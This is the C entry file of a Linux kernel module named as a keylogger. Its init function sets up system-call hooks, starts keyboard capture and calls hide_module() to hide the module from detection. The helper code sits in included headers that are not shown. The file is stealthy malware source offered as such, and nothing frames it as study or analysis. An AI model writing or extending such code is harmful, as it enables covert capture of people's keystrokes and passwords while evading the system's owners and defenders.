#include <linux/kernel.h>
#include <linux/module.h>

#include "include/keyboard.h"
#include "include/module.h"
#include "include/sys_calls.h"

MODULE_LICENSE("GPL");

static int __init keylogger_init(void)
{
	int rc = sys_calls_init();
	if (rc != 0) {
		return -1;
	}

	keyboard_init();
	hide_module();

    return 0;
}

static void __exit keylogger_exit(void)
{
	keyboard_cleanup();
	sys_calls_cleanup();
}

module_init(keylogger_init);
module_exit(keylogger_exit);
